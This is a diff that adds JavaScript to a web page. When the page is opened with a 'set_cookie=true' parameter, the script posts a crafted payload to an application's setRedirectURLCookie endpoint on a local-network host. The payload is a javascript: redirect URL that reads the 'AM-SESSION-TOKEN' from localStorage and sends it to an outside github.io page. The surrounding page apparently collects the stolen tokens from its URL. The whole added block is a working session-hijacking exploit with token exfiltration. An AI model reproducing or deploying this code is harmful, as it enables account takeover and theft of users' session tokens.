@@ -25,6 +25,47 @@
                     "No session token found in the URL.";
             }
         };
+
+        const urlParams = new URLSearchParams(window.location.search);
+if (urlParams.get("set_cookie") === "true") {
+    // The URL to send the request to
+    const url = "http://192.168.163.129:8000/clp/rest/util/setRedirectURLCookie";
+
+    // The payload to send in the request
+    const payload = {
+        redirectURL: "javascript:window.location.href='https://kimchanyeop.github.io/?sessiontoken='+localStorage.getItem('AM-SESSION-TOKEN');"
+    };
+
+    // Sending the POST request
+    fetch(url, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json;charset=UTF-8",
+            "Cache-Control": "no-cache, no-store, must-revalidate",
+            "Pragma": "no-cache",
+            "If-Modified-Since": "Mon, 26 Jul 1997 05:00:00 GMT",
+            "Accept": "application/json, text/plain, */*",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+            "Origin": "http://192.168.163.129:8000",
+            "Referer": "http://192.168.163.129:8000/clp/axmxsso"
+        },
+        body: JSON.stringify(payload)
+    })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json(); // Parse the JSON response
+        })
+        .then(data => {
+            console.log("Response received:", data);
+        })
+        .catch(error => {
+            console.error("Error during fetch:", error);
+        });
+} else {
+    console.log("Parameter 'set_cookie=true' not found. Request not sent.");
+}
     </script>
 </head>
 <body>
